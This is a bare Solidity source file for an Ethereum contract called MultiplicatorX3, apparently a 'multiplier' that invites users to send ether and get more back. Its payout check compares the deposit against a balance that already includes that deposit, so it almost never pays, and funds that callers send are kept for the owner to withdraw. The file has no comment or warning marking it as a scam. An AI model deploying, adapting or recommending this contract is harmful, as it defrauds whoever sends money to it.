pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _adr, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiplicate(address _adr) public payable {
        if (msg.value >= this.balance) {
            _adr.transfer(this.balance + msg.value);
        }
    }
}